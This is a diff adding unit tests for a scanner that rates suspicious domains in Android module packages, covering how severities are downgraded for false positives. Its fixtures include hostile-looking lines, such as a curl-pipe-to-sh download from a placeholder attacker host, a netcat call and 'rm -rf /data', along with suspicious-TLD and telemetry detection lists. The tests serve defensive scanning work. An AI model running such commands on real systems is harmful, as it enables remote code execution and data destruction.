@@ -5223,3 +5223,203 @@ test('T4-C4 不变量（工单 §2.4）：一份身份 —— 条目只在 binar
   assert.deepEqual(r2.counts, r.counts);
   assert.equal(r2.riskLevel, r.riskLevel);
 });
+
+// ---------------------------------------------------------------------------
+// P10：`SUSPICIOUS_DOMAIN` 的 severity 从「行级命中可疑 TLD」换成**贴着匹配点边界的三条锚点**
+//      + 「反向 DNS 包名覆盖」，两条叠加。工单 `briefs/task-p10.md`，历史见 risk-rules.mjs 的注释。
+//
+// ⚠ 本轮是**放宽方向**（收窄拦截范围）：只往下降级 medium → info，不新增命中、不改三张词表。
+//   判据的强度顺序是设计的一部分，不是并列 if：
+//     1) 遥测关键词 ⇒ medium（本轮不碰）
+//     2) 不命中 SUSPICIOUS_TLD ⇒ null（照旧）
+//     3) 强锚点（①scheme 一路连到匹配点 / ②后面紧跟 /path）⇒ medium —— 压过包名豁免
+//     4) 反向 DNS 包名（首段 ∈ com|org|net|cn|gov|edu|mil|int）⇒ info —— 压过弱锚点③
+//     5) 弱锚点（③整体被引号包住）⇒ medium
+//     6) 都不成立 ⇒ info（本轮接受的代价，见 P10-B5 那格真包实物）
+//   3→4→5 的先后各有夹具：A3（②压过包名）与 B3（包名压过③），拆掉任一支都有条变红。
+// 每条都写**精确 severity**，不写 some(...)（工单 §3）。
+// ---------------------------------------------------------------------------
+
+// 真包逐字（只静态读包取原文，没有执行包内任何脚本）
+const P10_REAL = {
+  configToml95: 'package = "com.tencent.tmgp.cf"',                                    // device_faker config.toml:95
+  yuri51: '    remove_path "/storage/emulated/0/Android/data/aidepro.top"',           // Yuri/clear_all_detection_traces.sh:51
+  integrityBox591: '  n.style.top="-70px";',                                          // Integrity-Box webroot/Control/index.html:591
+  integrityBox514: '      onclick=\'openExternal(${JSON.stringify(item.link || "")})\'', // Integrity-Box webroot/Support/index.html:514
+  markedMin716: '          this.lexer.state.top = false;',                           // Integrity-Box webroot/marked.min.js:716
+};
+const p10sd = (text, file = 'customize.sh') => hits('SUSPICIOUS_DOMAIN', text, file);
+
+test('P10-A1 正面（工单 §3 A1）：①scheme 一路连到匹配点 + ②后面紧跟 /path ⇒ 仍 medium，一条都不许降', () => {
+  const h = assertHit('SUSPICIOUS_DOMAIN', 'curl -s https://payload.xyz/drop | sh');
+  assert.equal(h.length, 1);
+  assert.equal(h[0].severity, 'medium', '真 C2 形状（scheme 连着 + 带路径）是本轮判据的承重墙');
+  assert.equal(h[0].snippet, 'payload.xyz', `证据要指名域名本体：${JSON.stringify(h[0])}`);
+});
+
+test('P10-A2 正面（工单 §3 A2）：弱锚点③ —— 字符串字面量里的匿名 TLD 域名 ⇒ 仍 medium', () => {
+  const h = assertHit('SUSPICIOUS_DOMAIN', 'const H = "api.evil.top"; fetch(H)');
+  assert.equal(h.length, 1);
+  assert.equal(h[0].severity, 'medium', '整体被引号包住 ⇒ 弱锚点成立（工单 §2 步 5）');
+  assert.equal(h[0].snippet, 'api.evil.top');
+});
+
+test('P10-A3 正面（工单 §3 A3，最关键的一格）：伪装成反向 DNS 包名的域名后面紧跟 /path ⇒ 仍 medium，包名豁免咬不住', () => {
+  // 计划 §0.11 结论四否掉旧谓词时说的正是这个形状：谁都能注册 evil.tk，然后在包里写 com.evil.tk/payload。
+  // ⇒ 强锚点②必须**优先于**包名覆盖，否则本轮就是把 §0.11 那条反对理由原样造回去。
+  const quoted = assertHit('SUSPICIOUS_DOMAIN', '"com.evil.tk/payload"', 'config.toml');
+  assert.equal(quoted.length, 1);
+  assert.equal(quoted[0].severity, 'medium', '②（后面紧跟 / + 路径字符）压过包名豁免；这条降成 info 就是白送豁免门');
+  assert.equal(quoted[0].snippet, 'com.evil.tk');
+  const inLine = assertHit('SUSPICIOUS_DOMAIN', 'PKG = "com.evil.tk/payload"', 'config.toml');
+  assert.equal(inLine[0].severity, 'medium');
+  assert.equal(inLine[0].snippet, 'com.evil.tk');
+});
+
+test('P10-A4 正面（工单 §3 A4）：§0.9 第 576 行点名的两条旧夹具行为一字不变', () => {
+  const a = assertHit('SUSPICIOUS_DOMAIN', 'https://x.tk/p', 'customize.sh');
+  assert.equal(a.length, 1);
+  assert.equal(a[0].severity, 'medium');
+  assert.equal(a[0].snippet, 'x.tk');
+  // 第二条旧夹具 `1.2.3.4:8080` 本来就不归 SUSPICIOUS_DOMAIN 管（末段不是字母 ⇒ pattern 不成立），
+  // 它由 HARDCODED_IP 说话。钉「行为不许变」= 两边都不许被本轮带歪。
+  assertNoHit('SUSPICIOUS_DOMAIN', 'nc 1.2.3.4:8080');
+  assert.equal(assertHit('HARDCODED_IP', 'nc 1.2.3.4:8080')[0].severity, 'medium');
+});
+
+test('P10-A5 正面（工单 §3 A5）：遥测/广告那一支原样，且排在锚点之前 —— 新顺序不许把它带歪', () => {
+  const kw = assertHit('SUSPICIOUS_DOMAIN', 'curl https://sdk.umeng.com/collect', 'customize.sh');
+  assert.equal(kw[0].severity, 'medium');
+  assert.equal(assertHit('SUSPICIOUS_DOMAIN', 'POST https://www.googletagmanager.com/gtm.js')[0].severity, 'medium');
+  // 这一条是顺序钉子：**三条锚点都不成立、首段也不是保留字**，只有「关键词先判」才留得住 medium。
+  // 若把关键词那一支挪到锚点之后，它会掉到 info（本轮没动它，也没有它的误报证据）。
+  const bare = assertHit('SUSPICIOUS_DOMAIN', 'ads=doubleclick.net', 'module.prop');
+  assert.equal(bare.length, 1);
+  assert.equal(bare[0].severity, 'medium', '遥测关键词支不参与本轮收窄：它必须在锚点与包名之前判');
+});
+
+test('P10-A6 正面（工单 §3 A6 / B4）：io.github.foo.ml ⇒ 留在 medium（已知残留 FP，不是本轮要闭的对象）', () => {
+  // `io` 不在那八个反向 DNS 保留字里 —— 它**本身就是一个可疑 TLD**，收进来等于送出一条
+  // 「投稿者把包名换成 io. 前缀就能造形状」的豁免门（工单 §2 步 4）。代价如实写着：
+  // 反向 DNS 形状的 `io.github.foo.ml` 在引号里 ⇒ 弱锚点③成立 ⇒ 仍是 medium，这条 FP 本轮不修。
+  // §0.9 第 576 行当年要求它「不再是 medium」，那是被 §0.11 结论四否掉的那版谓词口径，本轮不照它做。
+  const h = assertHit('SUSPICIOUS_DOMAIN', 'const PKG = "io.github.foo.ml";', 'service.js');
+  assert.equal(h.length, 1);
+  assert.equal(h[0].severity, 'medium', '已知残留 FP：io 不是保留字，弱锚点③把它留在 medium（工单 §3 A6/B4）');
+  assert.equal(h[0].snippet, 'io.github.foo.ml');
+});
+
+test('P10-B1 反面（工单 §3 B1）：DOM/CSS 属性访问 t.style.top / n.style.top（HTML 与 JS 各一份）⇒ info 且证据仍在', () => {
+  const html = p10sd(P10_REAL.integrityBox591, 'webroot/Control/index.html');
+  assert.equal(html.length, 1, '降的是 severity，不是删证据 —— finding 必须仍然出现在报告面上');
+  assert.equal(html[0].severity, 'info', `逐字真包行必须降成 info：${JSON.stringify(html[0])}`);
+  assert.equal(html[0].snippet, 'n.style.top');
+  const js = p10sd('  var h = t.style.top;', 'webroot/assets/app.js');
+  assert.equal(js.length, 1);
+  assert.equal(js[0].severity, 'info');
+  assert.equal(js[0].snippet, 't.style.top');
+  // 同一族的两个真包形状（工单 §0.11 结论三点名的 `item.link` / `state.top`）
+  assert.equal(p10sd(P10_REAL.integrityBox514, 'webroot/Support/index.html')[0].severity, 'info');
+  assert.equal(p10sd(P10_REAL.markedMin716, 'webroot/marked.min.js')[0].severity, 'info');
+});
+
+test('P10-B2 反面（工单 §3 B2）：window.innerHeight-e.top（算术里的属性读）⇒ info', () => {
+  const h = p10sd('  max = window.innerHeight-e.top;', 'webroot/assets/app.js');
+  assert.equal(h.length, 1);
+  assert.equal(h[0].severity, 'info');
+  assert.equal(h[0].snippet, 'window.innerHeight-e.top');
+});
+
+test('P10-B3 反面（工单 §3 B3）：反向 DNS 包名 ⇒ info —— 且必须**优先于弱锚点③**，真包那条逐字', () => {
+  const bare = p10sd('com.tencent.tmgl.cf', 'module.prop');
+  assert.equal(bare.length, 1);
+  assert.equal(bare[0].severity, 'info');
+  // 承重的那一格：这一行**整体在引号里**，弱锚点③本来成立。包名覆盖若不优先于③，
+  // device_faker 只到 5/6，§2.6 那句「两条叠加才盖得住 6/6」就落不了地（变异 M3 摘掉包名覆盖必红在这里）。
+  const real = p10sd(P10_REAL.configToml95, 'config.toml');
+  assert.equal(real.length, 1);
+  assert.equal(real[0].severity, 'info', `真包 config.toml:95 必须降成 info：${JSON.stringify(real[0])}`);
+  assert.equal(real[0].snippet, 'com.tencent.tmgp.cf');
+  assert.match(real[0].advice, /反向 DNS 包名形状/, '降级的理由必须让人看得见（工单 §2 步 4：message/why 里写明）');
+});
+
+test('P10-B5 反面（工单 §3 B5，本轮接受的代价）：Yuri/clear_all_detection_traces.sh:51 的 aidepro.top 会被降成 info', () => {
+  // ⚠ 这条**不是误报修复**，是实物税：那是「清理痕迹」脚本里的一个外部域名，本轮判据里没有锚点，
+  // 于是掉进「无取用上下文 ⇒ info」。用户 2026-10-14 拍口径时认下这条代价（计划 §2.6 第三批）。
+  // 把它钉在反面，是为了让它被看见而不是被忘掉：任何把 info 再往下删、或反过来把它抬回 medium 的改动，都得先解释这一格。
+  const h = p10sd(P10_REAL.yuri51, 'Yuri/clear_all_detection_traces.sh');
+  assert.equal(h.length, 1, '税也必须是看得见的证据，不许从报告里消失');
+  assert.equal(h[0].severity, 'info', '本轮接受的代价逐字钉死：真该被看见的域名，因为没有锚点而降级');
+  assert.equal(h[0].snippet, 'aidepro.top');
+  assert.equal(countsTowardRisk(h[0]), false, 'info 不抬等级（工单 §2 硬约束 1）');
+});
+
+test('P10-C1 不变量（工单 §3）：基数一行一条、snippet 指名产生结论的匹配、maxPerFile、纯函数照旧', () => {
+  // 一行里既有降级候选又有真锚点 ⇒ 取**最大档**（收窄不许把整行拖松，也不许多出一条）
+  const mixed = p10sd('var p = "com.evil.tk/payload"; t.style.top = n.style.top;', 'webroot/assets/app.min.js');
+  assert.equal(mixed.length, 1, '一条规则一行最多一条（fix3-P7 契约 1）');
+  assert.equal(mixed[0].severity, 'medium', '非豁免匹配里的最大档（契约 3）：降级的一支不许带走 medium');
+  assert.equal(mixed[0].snippet, 'com.evil.tk', 'snippet 取产生结论的那个匹配，不是最左的（契约 4）');
+  // 全行都是降级候选 ⇒ 收敛成一条 info，仍然在报告面上
+  const allInfo = p10sd('t.style.top = 1; n.style.top = 2; e.link = 3;', 'webroot/assets/app.min.js');
+  assert.equal(allInfo.length, 1);
+  assert.equal(allInfo[0].severity, 'info');
+  // maxPerFile 仍是每文件每规则 20 条，且按**行**计
+  const many = Array.from({ length: 30 }, (_, i) => `  x${i}.style.top = ${i};`).join('\n');
+  assert.equal(p10sd(many, 'webroot/assets/app.min.js').length, 20, 'maxPerFile 语义不许被本轮碰歪');
+  // 纯函数：同输入两次同结果（判据不许带状态）
+  const t = 'const PKG = "com.foo.cf"; var y = e.top;\nhttps://a.tk/p';
+  assert.deepEqual(p10sd(t, 'webroot/app.js'), p10sd(t, 'webroot/app.js'));
+  // anchor 声明与闭包表口径不变
+  assert.equal(RULES_BY_ID.SUSPICIOUS_DOMAIN.anchor, 'anywhere');
+});
+
+test('P10-C2 钉子（工单 §3 末段）：三张词表逐字未动，且判据全仓只有一份实现', () => {
+  const src = readFileSync(new URL('./risk-rules.mjs', import.meta.url), 'utf8');
+  const TLD_LINE = 'const SUSPICIOUS_TLD = /\\.(?:xyz|top|tk|ml|ga|cf|gq|pw|cc|icu|rest|cyou|buzz|click|link|monster|su|live|lol)\\b/i;';
+  const KW_LINE = 'const SUSPICIOUS_KEYWORD = /(?:telemetry|tracker|tracking|analytics|adservice|ads?\\.(?:com|net)|doubleclick|googlesyndication|googletagmanager|umeng|talkingdata|appsflyer|adjust\\.com|branch\\.io|sentry\\.io|mixpanel|amplitude|bugly|jiagu|igexin)/i;';
+  const EX_LINE = '  exclude: /^\\s*#|localhost|android\\.com|github\\.com|githubusercontent\\.com|magisk|kernelsu|kernelsu\\.org|topjohnwu|google\\.com|googleapis\\.com|gstatic\\.com|w3\\.org|schema\\.org|json\\.org|example\\.com/,';
+  assert.ok(src.includes(TLD_LINE), 'SUSPICIOUS_TLD 词表必须逐字未动（本轮是收窄 severity，不是改词表）');
+  assert.ok(src.includes(KW_LINE), 'SUSPICIOUS_KEYWORD 词表必须逐字未动');
+  assert.ok(src.includes(EX_LINE), 'exclude 白名单必须逐字未动');
+  // 表长度对账：从上面那三行逐字文本里数，19 / 20 / 16
+  assert.equal(TLD_LINE.match(/\(\?:([^)]*)\)/)[1].split('|').length, 19, '可疑 TLD 表 19 项');
+  assert.equal(KW_LINE.split('|').length, 21, '遥测关键词表 20 项（其中一支是嵌套 (?:com|net)，所以切出 21 段）');
+  assert.equal(EX_LINE.match(/\|/g).length + 1, 16, 'exclude 白名单 16 项');
+  // pattern 逐字未动（severityFor 的输入形状因此还是那个 host）
+  assert.equal(RULES_BY_ID.SUSPICIOUS_DOMAIN.pattern.source, '\\b(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+[a-z]{2,24}\\b');
+  assert.equal(RULES_BY_ID.SUSPICIOUS_DOMAIN.pattern.flags, 'i');
+  // 反向 DNS 保留字表：就这八个，一个都不许多（io/dev/me/xyz 本身是可疑 TLD，收进来就是投稿者可造的豁免门）
+  const reservedLine = (src.split(/\r?\n/).find((l) => l.startsWith('const REVERSE_DNS_RESERVED_LABEL')) || '').replace(/ \/\/.*$/, '');
+  assert.equal(reservedLine, 'const REVERSE_DNS_RESERVED_LABEL = /^(?:com|org|net|cn|gov|edu|mil|int)$/i;',
+    '保留字表必须是具名单一常量、逐字这八个（工单 §2 步 4：判据只许有一份实现）');
+  assert.deepEqual(reservedLine.slice(reservedLine.indexOf('(?:') + 3, reservedLine.indexOf(')$/')).split('|'),
+    ['com', 'org', 'net', 'cn', 'gov', 'edu', 'mil', 'int'], '保留字表就是八个');
+  // 单一实现点：不许有第二条 SUSPICIOUS_DOMAIN_* 规则，也不许在 scan.mjs 里后处理（fix6-F1 的病）
+  const sdRules = CONTENT_RULES.filter((r) => /^SUSPICIOUS_DOMAIN/.test(r.id));
+  assert.equal(sdRules.length, 1, `SUSPICIOUS_DOMAIN 族只许一条规则：${sdRules.map((r) => r.id).join(',')}`);
+  const scanSrc = readFileSync(new URL('./scan.mjs', import.meta.url), 'utf8');
+  assert.ok(!/SUSPICIOUS_DOMAIN/.test(scanSrc), 'scan.mjs 不许对这条规则做 severity 后处理 —— 判据住在 severityFor 里');
+});
+
+test('P10-C3 整包（工单 §2 硬约束 1）：降的是 severity，不是删证据，等级也不许被降级带松', async () => {
+  const zip = makeModuleZip({ id: 'eval.p10c3', files: [
+    ['module.prop', moduleProp('eval.p10c3')],
+    ['customize.sh', '#!/system/bin/sh\nrm -rf /data\n'],
+    ['webroot/Control/index.html', `${P10_REAL.integrityBox591}\n`],
+    ['webroot/assets/app.js', '  var h = t.style.top;\n  max = window.innerHeight-e.top;\n'],
+    ['config.toml', `${P10_REAL.configToml95}\n`],
+    ['Yuri/clear_all_detection_traces.sh', `${P10_REAL.yuri51}\n`],
+  ] });
+  const r = await scanToReport(zip, { changeType: 'first' });
+  const sd = r.findings.filter((f) => f.ruleId === 'SUSPICIOUS_DOMAIN');
+  assert.equal(sd.length, 5, '报告面上 5 条一条都不许多/少（降级只改 severity）');
+  assert.deepEqual(sd.map((f) => f.severity), ['info', 'info', 'info', 'info', 'info'], '五格全降 ⇒ 但都在 findings 里');
+  assert.equal(countsTowardRisk(sd[0]), false);
+  assert.equal(r.counts.info, sd.length, '它们落进 counts.info，不落进 medium');
+  assert.equal(r.counts.medium, 0, '降级不许凭空造出 medium，也不许把 info 记成 low');
+  assert.equal(r.riskLevel, 'high', '整包等级由别的规则说话：info 再多也不抬，别的命中也不许因为降级而消失');
+  assert.equal(r.decision.action, 'block');
+  const keys = r.findings.map((f) => `${f.ruleId}@${f.file}:${f.line}`);
+  assert.equal(new Set(keys).size, keys.length, 'counts 去重键口径不变');
+});
